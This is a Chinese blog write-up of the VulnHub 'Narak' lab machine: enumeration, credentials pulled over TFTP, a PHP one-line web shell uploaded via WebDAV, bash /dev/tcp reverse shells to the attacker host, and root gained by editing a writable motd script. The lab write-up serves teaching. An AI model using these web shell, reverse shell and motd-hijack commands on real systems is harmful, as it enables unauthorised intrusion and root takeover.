+++
date = '2026-11-08T14:55:17+08:00'
draft = false
title = '[VulnHub靶机]Narak渗透记录'
tags = ['渗透','Vulnhub','tftp','webdav','brainfuck','crypto','motd']
+++

## 主机发现&端口扫描

攻击机IP: 10.10.10.3
靶机IP: 10.10.10.13

```shell
┌──(kali㉿kali)-[~/Narak]
└─$ sudo arp-scan -l
Interface: eth0, type: EN10MB, MAC: 00:0c:29:5f:ca:d5, IPv4: 10.10.10.3
Starting arp-scan 1.10.0 with 256 hosts (https://github.com/royhills/arp-scan)
10.10.10.1      00:50:56:c0:00:08       VMware, Inc.
10.10.10.2      00:50:56:fc:41:2a       VMware, Inc.
10.10.10.13     00:0c:29:a1:b6:b9       VMware, Inc.
10.10.10.254    00:50:56:e0:f0:a6       VMware, Inc.

4 packets received by filter, 0 packets dropped by kernel
Ending arp-scan 1.10.0: 256 hosts scanned in 2.033 seconds (125.92 hosts/sec). 4 responded
```

探测端口开放情况

```shell
┌──(kali㉿kali)-[~/Narak]
└─$ sudo nmap --min-rate 10000 -p- 10.10.10.13                    
Starting Nmap 7.991 ( https://nmap.org ) at 2026-11-08 14:57 +0800
Nmap scan report for 10.10.10.13
Host is up (0.00011s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
MAC Address: 00:0C:29:A1:B6:B9 (VMware)

Nmap done: 1 IP address (1 host up) scanned in 1.91 seconds
```

详细扫描

```shell
┌──(kali㉿kali)-[~/Narak]
└─$ sudo nmap -sT -sV -sC -O -p22,80 10.10.10.13                     
Starting Nmap 7.991 ( https://nmap.org ) at 2026-11-08 14:58 +0800
Nmap scan report for 10.10.10.13
Host is up (0.00062s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 71:bd:59:2d:22:1e:b3:6b:4f:06:bf:83:e1:cc:92:43 (RSA)
|   256 f8:ec:45:84:7f:29:33:b2:8d:fc:7d:07:28:93:31:b0 (ECDSA)
|_  256 d0:94:36:96:04:80:33:10:40:68:32:21:cb:ae:68:f9 (ED25519)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: HA: NARAK
MAC Address: 00:0C:29:A1:B6:B9 (VMware)
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Aggressive OS guesses: Linux 3.2 - 4.14 (97%), Linux 3.10 - 4.11 (95%), Linux 3.13 - 3.16 (94%), Linux 3.8 - 3.16 (94%), Linux 4.10 (94%), Linux 3.4 - 3.10 (94%), Linux 5.1 - 5.15 (94%), Synology DiskStation Manager 5.2-5644 (93%), Linux 3.10 (93%), OpenWrt 19.07 (Linux 4.14) (93%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 1 hop
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 11.03 seconds
```

漏洞扫描

```shell
┌──(kali㉿kali)-[~/Narak]
└─$ sudo nmap -sT -sV -sC -O -p22,80 10.10.10.13
Starting Nmap 7.991 ( https://nmap.org ) at 2026-11-08 14:58 +0800
Nmap scan report for 10.10.10.13
Host is up (0.00062s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   2048 71:bd:59:2d:22:1e:b3:6b:4f:06:bf:83:e1:cc:92:43 (RSA)
|   256 f8:ec:45:84:7f:29:33:b2:8d:fc:7d:07:28:93:31:b0 (ECDSA)
|_  256 d0:94:36:96:04:80:33:10:40:68:32:21:cb:ae:68:f9 (ED25519)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: HA: NARAK
MAC Address: 00:0C:29:A1:B6:B9 (VMware)
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Aggressive OS guesses: Linux 3.2 - 4.14 (97%), Linux 3.10 - 4.11 (95%), Linux 3.13 - 3.16 (94%), Linux 3.8 - 3.16 (94%), Linux 4.10 (94%), Linux 3.4 - 3.10 (94%), Linu
x 5.1 - 5.15 (94%), Synology DiskStation Manager 5.2-5644 (93%), Linux 3.10 (93%), OpenWrt 19.07 (Linux 4.14) (93%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 1 hop
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 11.03 seconds
```

## Web渗透

浏览器访问80端口的Web服务, 是一些图片

![](https://cdn.jsdelivr.net/gh/Pieyue/blog_images@main/%E9%9D%B6%E6%9C%BA/Narak/%E8%AE%BF%E9%97%AE80%E7%AB%AF%E5%8F%A3.avif)

最下面有个按钮, 上面写着"Do Not Click"

![](https://cdn.jsdelivr.net/gh/Pieyue/blog_images@main/%E9%9D%B6%E6%9C%BA/Narak/%E5%8F%91%E7%8E%B0DoNotClick.avif)

我们偏要点, 发现是个漫画, 注意到URL中出现了`?`, 代表可能有参数

![](https://cdn.jsdelivr.net/gh/Pieyue/blog_images@main/%E9%9D%B6%E6%9C%BA/Narak/%E6%BC%AB%E7%94%BB.avif)

用ffuf看看能不能测出文件包含

```shell
┌──(kali㉿kali)-[~/Narak]
└─$ ffuf -u 'http://10.10.10.13/images/666.jpg?FUZZ=../../../../../../../../etc/passwd' -w /usr/share/wordlists/wfuzz/general/common.txt -c -fs 103552

        /'___\  /'___\           /'___\
       /\ \__/ /\ \__/  __  __  /\ \__/
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/
         \ \_\   \ \_\  \ \____/  \ \_\
          \/_/    \/_/   \/___/    \/_/  

       v2.3.0
________________________________________________

 :: Method           : GET
 :: URL              : http://10.10.10.13/images/666.jpg?FUZZ=../../../../../../../../etc/passwd
 :: Wordlist         : FUZZ: /usr/share/wordlists/wfuzz/general/common.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
 :: Filter           : Response size: 103552
________________________________________________

:: Progress: [951/951] :: Job [1/1] :: 60 req/sec :: Duration: [0:00:03] :: Errors: 0 ::
```

使用gobuster和更大的字典重新爆破目录, 并指定一些扩展名

```shell
┌──(kali㉿kali)-[~/Narak]
└─$ gobuster dir -u http://10.10.10.13/ -x rar,zip,txt,sql -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt 
===============================================================
Gobuster v3.8.2
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.10.13/
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.8.2
[+] Extensions:              rar,zip,txt,sql
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
images               (Status: 301) [Size: 311] [--> http://10.10.10.13/images/]
tips.txt             (Status: 200) [Size: 58]
webdav               (Status: 401) [Size: 458]
server-status        (Status: 403) [Size: 276]
Progress: 1102790 / 1102790 (100.00%)
===============================================================
Finished
===============================================================
```

查看tips.txt, 提醒我们找到creds.txt

![](https://cdn.jsdelivr.net/gh/Pieyue/blog_images@main/%E9%9D%B6%E6%9C%BA/Narak/tips.avif)

访问webdav, 提示我们输入凭据

![](https://cdn.jsdelivr.net/gh/Pieyue/blog_images@main/%E9%9D%B6%E6%9C%BA/Narak/webdav.avif)

## tftp信息收集

Web路线到这里就没有其它进度了, 接下来扫描一下UDP端口看看有没有线索

```shell
┌──(kali㉿kali)-[~/Narak]
└─$ sudo nmap -sU --top-ports 20 10.10.10.13
Starting Nmap 7.991 ( https://nmap.org ) at 2026-11-08 15:29 +0800
Nmap scan report for 10.10.10.13
Host is up (0.0013s latency).

PORT      STATE         SERVICE
53/udp    open|filtered domain
67/udp    open|filtered dhcps
68/udp    open|filtered dhcpc
69/udp    open|filtered tftp
123/udp   closed        ntp
135/udp   closed        msrpc
137/udp   closed        netbios-ns
138/udp   closed        netbios-dgm
139/udp   open|filtered netbios-ssn
161/udp   closed        snmp
162/udp   open|filtered snmptrap
445/udp   closed        microsoft-ds
500/udp   open|filtered isakmp
514/udp   open|filtered syslog
520/udp   closed        route
631/udp   closed        ipp
1434/udp  closed        ms-sql-m
1900/udp  open|filtered upnp
4500/udp  open|filtered nat-t-ike
49152/udp closed        unknown
MAC Address: 00:0C:29:A1:B6:B9 (VMware)

Nmap done: 1 IP address (1 host up) scanned in 8.84 seconds
```

发现tftp可能开放, 尝试连接

>TFTP 全称是 Trivial File Transfer Protocol，即简单文件传输协议。它是一种用于在网络上进行简单文件传输的协议，主要特点是设计精简、开销小，但功能也相对有限。
>
>📝 核心特点
>基于 UDP：TFTP 运行在 UDP 协议之上，使用端口 69 进行初始通信。它不像 FTP 那样需要建立复杂的 TCP 连接，因此传输开销更小。
>
>无认证机制：协议本身不包含登录或访问控制功能。这意味着它的安全性完全依赖于服务器端的文件系统权限设置，通常用于受信任的内部网络环境。
>
>传输方式简单：它主要用于读取或写入文件，不支持像标准 FTP 那样的目录列表、删除或重命名等复杂操作。
>
>数据块小：默认的数据块大小为 512 字节，每发送一个数据块都需要等待接收方的确认（ACK）后才能发送下一个

```shell
┌──(kali㉿kali)-[~/Narak]
└─$ tftp 10.10.10.13
tftp>
```

tftp没有列出文件(ls)的功能, 想要下载服务器上的文件必须要先知道其名称, 因为之前tips.txt中告诉我们一个叫creds.txt的文件, 尝试下载

```shell
tftp> get creds.txt
```

creds.txt是一串base64编码的字符串

```text
eWFtZG9vdDpTd2FyZw==
```

解码得到以下凭据

```text
yamdoot:Swarg
```

## webdav上传木马

把它输到webdav中, 成功进入, 里面是空目录

>WebDAV 全称是 Web-based Distributed Authoring and Versioning，即基于 Web 的分布式创作和版本控制。简单理解，它是 HTTP 协议的一个扩展，让用户能像操作本地文件一样，通过 Web 来远程管理服务器上的文件。

![](https://cdn.jsdelivr.net/gh/Pieyue/blog_images@main/%E9%9D%B6%E6%9C%BA/Narak/webdav%E7%A9%BA%E7%9B%AE%E5%BD%95.avif)

使用davtest检查我们都有哪些权限

```shell
┌──(kali㉿kali)-[~/Narak]
└─$ davtest -url http://10.10.10.13/webdav/ -auth yamdoot:Swarg
********************************************************
 Testing DAV connection
OPEN            SUCCEED:                http://10.10.10.13/webdav
********************************************************
NOTE    Random string for this session: XQ5UMX
********************************************************
 Creating directory
MKCOL           SUCCEED:                Created http://10.10.10.13/webdav/DavTestDir_XQ5UMX
********************************************************
 Sending test files
PUT     asp     SUCCEED:        http://10.10.10.13/webdav/DavTestDir_XQ5UMX/davtest_XQ5UMX.asp
PUT     cfm     SUCCEED:        http://10.10.10.13/webdav/DavTestDir_XQ5UMX/davtest_XQ5UMX.cfm
PUT     php     SUCCEED:        http://10.10.10.13/webdav/DavTestDir_XQ5UMX/davtest_XQ5UMX.php
PUT     txt     SUCCEED:        http://10.10.10.13/webdav/DavTestDir_XQ5UMX/davtest_XQ5UMX.txt
PUT     jsp     SUCCEED:        http://10.10.10.13/webdav/DavTestDir_XQ5UMX/davtest_XQ5UMX.jsp
PUT     jhtml   SUCCEED:        http://10.10.10.13/webdav/DavTestDir_XQ5UMX/davtest_XQ5UMX.jhtml
PUT     html    SUCCEED:        http://10.10.10.13/webdav/DavTestDir_XQ5UMX/davtest_XQ5UMX.html
PUT     cgi     SUCCEED:        http://10.10.10.13/webdav/DavTestDir_XQ5UMX/davtest_XQ5UMX.cgi
PUT     pl      SUCCEED:        http://10.10.10.13/webdav/DavTestDir_XQ5UMX/davtest_XQ5UMX.pl
PUT     shtml   SUCCEED:        http://10.10.10.13/webdav/DavTestDir_XQ5UMX/davtest_XQ5UMX.shtml
PUT     aspx    SUCCEED:        http://10.10.10.13/webdav/DavTestDir_XQ5UMX/davtest_XQ5UMX.aspx
********************************************************
 Checking for test file execution
EXEC    asp     FAIL
EXEC    cfm     FAIL
EXEC    php     SUCCEED:        http://10.10.10.13/webdav/DavTestDir_XQ5UMX/davtest_XQ5UMX.php
EXEC    php     FAIL
EXEC    txt     SUCCEED:        http://10.10.10.13/webdav/DavTestDir_XQ5UMX/davtest_XQ5UMX.txt
EXEC    txt     FAIL
EXEC    jsp     FAIL
EXEC    jhtml   FAIL
EXEC    html    SUCCEED:        http://10.10.10.13/webdav/DavTestDir_XQ5UMX/davtest_XQ5UMX.html
EXEC    html    FAIL
EXEC    cgi     FAIL
EXEC    pl      FAIL
EXEC    shtml   FAIL
EXEC    aspx    FAIL

********************************************************
/usr/bin/davtest Summary:
Created: http://10.10.10.13/webdav/DavTestDir_XQ5UMX
PUT File: http://10.10.10.13/webdav/DavTestDir_XQ5UMX/davtest_XQ5UMX.asp
PUT File: http://10.10.10.13/webdav/DavTestDir_XQ5UMX/davtest_XQ5UMX.cfm
PUT File: http://10.10.10.13/webdav/DavTestDir_XQ5UMX/davtest_XQ5UMX.php
PUT File: http://10.10.10.13/webdav/DavTestDir_XQ5UMX/davtest_XQ5UMX.txt
PUT File: http://10.10.10.13/webdav/DavTestDir_XQ5UMX/davtest_XQ5UMX.jsp
PUT File: http://10.10.10.13/webdav/DavTestDir_XQ5UMX/davtest_XQ5UMX.jhtml
PUT File: http://10.10.10.13/webdav/DavTestDir_XQ5UMX/davtest_XQ5UMX.html
PUT File: http://10.10.10.13/webdav/DavTestDir_XQ5UMX/davtest_XQ5UMX.cgi
PUT File: http://10.10.10.13/webdav/DavTestDir_XQ5UMX/davtest_XQ5UMX.pl
PUT File: http://10.10.10.13/webdav/DavTestDir_XQ5UMX/davtest_XQ5UMX.shtml
PUT File: http://10.10.10.13/webdav/DavTestDir_XQ5UMX/davtest_XQ5UMX.aspx
Executes: http://10.10.10.13/webdav/DavTestDir_XQ5UMX/davtest_XQ5UMX.php
Executes: http://10.10.10.13/webdav/DavTestDir_XQ5UMX/davtest_XQ5UMX.txt
Executes: http://10.10.10.13/webdav/DavTestDir_XQ5UMX/davtest_XQ5UMX.html
```

注意到我们可以上传并执行php文件, 接下来只需上传一句话木马就行了  
使用cadaver登录webdav

```shell
┌──(kali㉿kali)-[~/Narak]
└─$ cadaver http://10.10.10.13/webdav/
Authentication required for webdav on server `10.10.10.13':
Username: yamdoot
Password:
dav:/webdav/> 
```

上传一句话木马

```php
<?php system($_GET["cmd"]);?>
```

```shell
dav:/webdav/> put ./shell.php
Uploading ./shell.php to `/webdav/shell.php':
Progress: [=============================>] 100.0% of 30 bytes succeeded.
```

攻击机开启监听, 访问`http://10.10.10.13/webdav/shell.php?cmd=%2Fbin%2Fbash+-c+%22%2Fbin%2Fbash+-i+%3E%26%2Fdev%2Ftcp%2F10.10.10.3%2F4444+0%3E%261%22`即可获得shell

```shell
┌──(kali㉿kali)-[~/Narak]
└─$ rlwrap nc -lvnp 4444
listening on [any] 4444 ...
connect to [10.10.10.3] from (UNKNOWN) [10.10.10.13] 59442
bash: cannot set terminal process group (580): Inappropriate ioctl for device
bash: no job control in this shell
www-data@ubuntu:/var/www/webdav$
```

## 权限提升

在查看/home目录, 发现三个文件夹

```shell
www-data@ubuntu:/home$ ls
inferno
narak
yamdoot
```

在inferno中发现第一个flag

```shell
www-data@ubuntu:/home$ cd inferno
www-data@ubuntu:/home/inferno$ ls
user.txt
www-data@ubuntu:/home/inferno$ cat user.txt
Flag: {5f95bf06ce19af69bfa5e53f797ce6e2}
```

查找所有我们有写权限的文件

```shell
www-data@ubuntu:/mnt$ find / -writable -type f -not -path "/var/www/*" -not -path "/proc/*" 2>/dev/null
/mnt/hell.sh
/sys/kernel/security/apparmor/.remove
/sys/kernel/security/apparmor/.replace
/sys/kernel/security/apparmor/.load
/sys/kernel/security/apparmor/.access
/sys/fs/cgroup/memory/cgroup.event_control
/etc/update-motd.d/91-release-upgrade
/etc/update-motd.d/00-header
/etc/update-motd.d/50-motd-news
/etc/update-motd.d/80-esm
/etc/update-motd.d/80-livepatch
/etc/update-motd.d/10-help-text
/etc/apache2/users.password
```

查看hell.sh

```bash
#!/bin/bash

echo"Highway to Hell";
--[----->+<]>---.+++++.+.+++++++++++.--.+++[->+++<]>++.++++++.--[--->+<]>--.-----.++++.
```

最下面的那一行根据字符集可判断出是Brainfuck语言

| 语法 | 含义 |
| ---- | --- |
| > | 指针向右移动一格 |
| < | 指针向左移动一格 |
| + | 使指针当前格的字节数值加1 |
| - | 使指针当前格的字节数值减1 |
| . | 把当前格数值按 ASCII 表输出到终端 |
| , | 接受一个字节的输入，将其值存储在数据指针的字节中。 |
| [ | 当指针当前值为 0 时，程序跳转至与之对应的 ] 之后；否则程序正常执行 |
| ] | 程序跳转回与之对应的 [ 处 |

保存Brainfuck代码

```shell
┌──(kali㉿kali)-[~/Narak]
└─$ echo '--[----->+<]>---.+++++.+.+++++++++++.--.+++[->+++<]>++.++++++.--[--->+<]>--.-----.++++.' > hell.bf
```

使用解释器beef运行

```shell
┌──(kali㉿kali)-[~/Narak]
└─$ beef hell.bf
chitragupt
```

得到了一段字符串, 很有可能是密码

查看靶机中有bash环境的用户

```shell
ww-data@ubuntu:/mnt$ cat /etc/passwd | grep 'bash'
root:x:0:0:root:/root:/bin/bash
narak:x:1000:1000:narak,,,:/home/narak:/bin/bash
yamdoot:x:1001:1001:,,,:/home/yamdoot:/bin/bash
inferno:x:1002:1002:,,,:/home/inferno:/bin/bash
```

逐个尝试, 最后发现inferno可以登录

```shell
┌──(kali㉿kali)-[~/Narak]
└─$ ssh inferno@10.10.10.13
The authenticity of host '10.10.10.13 (10.10.10.13)' can't be established.
ED25519 key fingerprint is: SHA256:A4qSwLMJMXo/YuhKxw/H/4ezPo8GmE3SuuMQr98X7TU
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.10.10.13' (ED25519) to the list of known hosts.
** WARNING: connection is not using a post-quantum key exchange algorithm.
** This session may be vulnerable to "store now, decrypt later" attacks.
** The server may need to be upgraded. See https://openssh.com/pq.html
inferno@10.10.10.13's password:
Welcome to Ubuntu 18.04 LTS (GNU/Linux 4.15.0-20-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage


The programs included with the Ubuntu system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
applicable law.

inferno@ubuntu:~$
```

之前find搜索到的`/etc/update-motd.d/00-header`我们拥有写权限, 该文件的作用是在登录时打印欢迎信息, 且以root身份运行, 现在我们看一下它

```shell
inferno@ubuntu:~$ ls -lhd /etc/update-motd.d/00-header
-rwxrwxrwx 1 root root 1.2K Apr  9  2018 /etc/update-motd.d/00-header
```

在尾部插入反弹shell代码

```bash
bash -c "bash -i >&/dev/tcp/10.10.10.3/4444 0>&1"
```

攻击机开启监听, 重新登录靶机ssh, 即可获得rootshell

```shell
┌──(kali㉿kali)-[~/Narak]
└─$ rlwrap nc -lvnp 4444
listening on [any] 4444 ...
connect to [10.10.10.3] from (UNKNOWN) [10.10.10.13] 59446
bash: cannot set terminal process group (1301): Inappropriate ioctl for device
bash: no job control in this shell
root@ubuntu:/#
```

查看root.txt

```shell
root@ubuntu:/root# cat root.txt
cat root.txt
██████████████████████████████████████████████████████████████████████████████████████████
█░░░░░░██████████░░░░░░█░░░░░░░░░░░░░░█░░░░░░░░░░░░░░░░███░░░░░░░░░░░░░░█░░░░░░██░░░░░░░░█
█░░▄▀░░░░░░░░░░██░░▄▀░░█░░▄▀▄▀▄▀▄▀▄▀░░█░░▄▀▄▀▄▀▄▀▄▀▄▀░░███░░▄▀▄▀▄▀▄▀▄▀░░█░░▄▀░░██░░▄▀▄▀░░█
█░░▄▀▄▀▄▀▄▀▄▀░░██░░▄▀░░█░░▄▀░░░░░░▄▀░░█░░▄▀░░░░░░░░▄▀░░███░░▄▀░░░░░░▄▀░░█░░▄▀░░██░░▄▀░░░░█
█░░▄▀░░░░░░▄▀░░██░░▄▀░░█░░▄▀░░██░░▄▀░░█░░▄▀░░████░░▄▀░░███░░▄▀░░██░░▄▀░░█░░▄▀░░██░░▄▀░░███
█░░▄▀░░██░░▄▀░░██░░▄▀░░█░░▄▀░░░░░░▄▀░░█░░▄▀░░░░░░░░▄▀░░███░░▄▀░░░░░░▄▀░░█░░▄▀░░░░░░▄▀░░███
█░░▄▀░░██░░▄▀░░██░░▄▀░░█░░▄▀▄▀▄▀▄▀▄▀░░█░░▄▀▄▀▄▀▄▀▄▀▄▀░░███░░▄▀▄▀▄▀▄▀▄▀░░█░░▄▀▄▀▄▀▄▀▄▀░░███
█░░▄▀░░██░░▄▀░░██░░▄▀░░█░░▄▀░░░░░░▄▀░░█░░▄▀░░░░░░▄▀░░░░███░░▄▀░░░░░░▄▀░░█░░▄▀░░░░░░▄▀░░███
█░░▄▀░░██░░▄▀░░░░░░▄▀░░█░░▄▀░░██░░▄▀░░█░░▄▀░░██░░▄▀░░█████░░▄▀░░██░░▄▀░░█░░▄▀░░██░░▄▀░░███
█░░▄▀░░██░░▄▀▄▀▄▀▄▀▄▀░░█░░▄▀░░██░░▄▀░░█░░▄▀░░██░░▄▀░░░░░░█░░▄▀░░██░░▄▀░░█░░▄▀░░██░░▄▀░░░░█
█░░▄▀░░██░░░░░░░░░░▄▀░░█░░▄▀░░██░░▄▀░░█░░▄▀░░██░░▄▀▄▀▄▀░░█░░▄▀░░██░░▄▀░░█░░▄▀░░██░░▄▀▄▀░░█
█░░░░░░██████████░░░░░░█░░░░░░██░░░░░░█░░░░░░██░░░░░░░░░░█░░░░░░██░░░░░░█░░░░░░██░░░░░░░░█
██████████████████████████████████████████████████████████████████████████████████████████
                           
                                                                                    
Root Flag: {9440aee508b6215995219c58c8ba4b45}                                           

!! Congrats you have finished this task !!
                                                        
Contact us here:                                        
                                                                
Hacking Articles : https://twitter.com/hackinarticles

Jeenali Kothari  : https://www.linkedin.com/in/jeenali-kothari/ 
                                                                                                                                
+-+-+-+-+-+ +-+-+-+-+-+-+-+                                     
 |E|n|j|o|y| |H|A|C|K|I|N|G|                    
 +-+-+-+-+-+ +-+-+-+-+-+-+-+                                            
__________________________________
```
